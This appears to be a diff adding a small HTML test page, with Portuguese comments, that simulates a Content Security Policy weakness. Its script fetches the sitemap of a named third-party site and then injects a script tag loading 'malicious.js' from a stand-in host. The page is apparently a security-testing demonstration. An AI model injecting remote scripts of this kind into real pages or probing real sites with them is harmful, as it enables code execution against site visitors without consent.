@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Testing CSP Vulnerability</title>
+</head>
+<body>
+    <h1>Simulating CSP Vulnerability</h1>
+    <script>
+        // Simulando a injeção de um script malicioso
+        fetch('https://bimdistribuidora.com.br/sitemap.xml')
+            .then(response => response.text())
+            .then(data => {
+                // Se a resposta incluir conteúdo sensível ou scripts, um atacante pode explorá-la
+                console.log('Data fetched from vulnerable site:', data);
+                
+                // Tentando injetar um script
+                let script = document.createElement('script');
+                script.src = 'https://example.com/malicious.js';
+                document.body.appendChild(script);
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
